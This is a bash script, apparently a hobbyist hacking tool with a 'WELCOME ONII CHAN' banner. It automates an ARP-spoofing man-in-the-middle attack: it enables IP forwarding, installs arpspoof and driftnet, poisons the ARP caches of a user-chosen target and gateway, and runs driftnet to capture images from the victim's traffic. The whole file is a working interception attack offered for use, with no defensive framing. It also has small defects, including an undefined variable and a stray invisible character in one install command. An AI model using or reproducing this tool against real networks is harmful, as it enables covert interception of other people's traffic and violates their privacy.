#!/bin/bash

# Function to handle CTRL+C (SIGINT)
cleanup() {
    echo -e "\n[!] Exiting... Killing background processes."
    pkill -f "arpspoof -i $Interface -t $Target $Gateway"
    pkill -f "arpspoof -i $Interface -t $Gateway $Target"
    echo "[*] Disabling IP forwarding..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
    exit 0
}

# Trap CTRL+C
trap cleanup INT

# Enable IP forwarding
echo "[*] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Welcome Banner
clear
echo -e "\033[1;34m
-------------------------------------------------------
|                    WELCOME                         |
|                   ONII CHAN                        |
| @uth0r Astra.X           Th4nk 2 B!n@ry N!5h@n     |
|                                                    |
-------------------------------------------------------
\033[0m"

# Check and install missing tools
REQUIRED_TOOLS=("arpspoof" "driftnet")

install_tool() {
    TOOL_NAME="$1"
    if command -v "$TOOL_NAME" &>/dev/null; then
        echo "[✓] $TOOL_NAME is already installed."
    else
        echo "[*] $TOOL_NAME not found. Attempting to install..."
        if command -v apt &>/dev/null; then
            sudo apt update && sudo apt install -y "$TOOL_NAME"
            sudo apt install dsniff ​-y
        elif command -v pacman &>/dev/null; then
            sudo pacman -Sy --noconfirm "$TOOL_NAME"
        elif command -v yum &>/dev/null; then
            sudo yum install -y "$TOOL_NAME"
        else
            echo "[!] No compatible package manager found. Please install $TOOL manually."
            exit 1
        fi
    fi
}

for tool in "${REQUIRED_TOOLS[@]}"; do
    install_tool "$tool"
done

# Get user input
read -rp "[+] Please Enter Interface Name: " Interface
read -rp "[+] Please Enter Target IP Address: " Target
read -rp "[+] Please Enter Gateway IP Address: " Gateway

# Launch attacks
echo -e "\n[+] Starting ARP spoofing between $Target and $Gateway..."
arpspoof -i "$Interface" -t "$Target" "$Gateway" &
arpspoof -i "$Interface" -t "$Gateway" "$Target" &

# Start driftnet to capture images
echo -e "\n[+] Starting Driftnet to capture media on the network..."
driftnet -i "$Interface"
